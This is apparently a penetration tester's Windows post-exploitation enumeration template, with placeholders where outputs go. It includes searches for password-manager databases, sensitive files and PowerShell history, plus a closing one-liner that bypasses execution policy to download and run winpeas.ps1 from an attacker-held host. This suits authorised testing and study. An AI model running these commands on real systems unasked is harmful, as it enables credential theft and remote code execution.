# System Information
## Username and Hostname
```powershell
whoami
```
```
<insert hostname\username here>
```

## Group memberships of the current user
```powershell
whoami /groups
```
```
<insert output here>
```

## Existing users and groups
### Enumerating Users
```batch
net user $USER
```
```
<insert output here>
```
```powershell
Get-LocalUser
```
```
<insert output here>
```
### Enumerating Groups
```batch
net localgroup
```
```
<insert output here>
```
```powershell
Get-LocalGroup
```
```
<insert output here>
```
```powershell
Get-LocalGroupMember $GROUP
```
```
<insert output here>
```

## Operating system, version and architecture
### System Information
```batch
systeminfo
```
```
<insert output here>
```
### Network Information
```batch
ipconfig /all
```
```
<insert output here>
```
```batch
route print
```
```
<insert output here>
```
```batch
netstat -ano
```
```
<insert output here>
```
### Installed Applications and Running Services
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
```
<insert output here>
```
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
```
<insert output here>
```
```batch
dir "C:\Program Files"
```
```
<insert output here>
```
```batch
dir "C:\Program Files (x86)"
```
```
<insert output here>
```
```batch
dir $env:userprofile\Downloads
```
```
<insert output here>
```
```powershell
Get-Process
```
```
<insert output here>
```
### Enumerate filesystem for sensitive details
Enumerate for password manager databases (i.e. .kbdx):
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
```
<insert output here>
```
Enumerate application filesystem for interesting files (i.e. XAMPP):
```powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
```
<insert output here>
```
Enumerate home directory for interesting files:
```powershell
Get-ChildItem -Path $env:userprofile -Include *.txt,*.pdf,*.xls,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
Also check other paths such as C:\, C:\Users.
```
<insert output here>
```
# Powershell Logs
```powershell
Get-History
```
```
<insert output here>
```
```powershell
(Get-PSReadlineOption).HistorySavePath
```
```
File Location: <insert output here>

<insert file contents here>
```
# No GUI?
If a compromised user isn't part of "Remote Desktop Users" or "Remote Management Users", this means RDP access can't be gained as that user.

Instead, use runas on an account with GUI access to run a cmd or powershell:
```powershell
runas /user:$USER cmd
```
# Winpeas
```powershell
powershell -exec bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://$IP_ADDRESS/winpeas.ps1'))"
```
```
<insert winpeas output here>
```
